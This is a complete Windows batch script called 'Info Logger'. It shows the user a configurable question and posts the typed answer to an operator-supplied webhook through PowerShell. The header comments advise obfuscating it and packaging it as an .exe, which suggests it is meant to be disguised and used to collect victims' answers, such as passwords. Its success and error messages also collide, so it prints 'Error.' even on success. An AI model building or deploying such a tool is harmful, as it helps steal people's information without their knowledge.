:: Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
:: I recommend using Bat2ExeXobfuscator for obfuscating and making this modified file a .exe (https://github.com/DARKNOSY/Bat2ExeXobfuscator)
@echo off
cls
color 5

setlocal EnableDelayedExpansion

set t=Info Logger/@DARKNOSY
:: title for console
title !t!
set message-after=Don't forget to check out the code. It contains all the information you need to modify it to your needs.
:: message after post request to webhook is successful
set message-AFTER=Error.
:: message after post request to webhook is unsuccessful
set question-asked=INSERT-QUESTION-HERE
:: put question instead of "INSERT-QUESTION-HERE" (don't use ' or any related symbols in the question)
set webhook_url=INSERT-WEBHOOK-HERE
:: insert you webhook link instead of INSERT-WEBHOOK-HERE
set /p content="!question-asked!:  "

set banner=https://avatars.githubusercontent.com/u/109553205?v=4
:: webhook embeded banner

set "payload={\"embeds\": [{\"author\": {\"name\": \"!question-asked!\"}, \"image\": {\"url\": \"!banner!\"}, \"description\": \"!content!\"}]}"
set "payload=!payload:"=^"!"

powershell -Command "$payload = '%payload%'; Invoke-RestMethod -Uri '%webhook_url%' -Method Post -ContentType 'application/json' -Body $payload"

if %errorlevel% equ 0 (
    echo %message-after%
) else (
    echo %message-AFTER%
)

pause
endlocal
exit
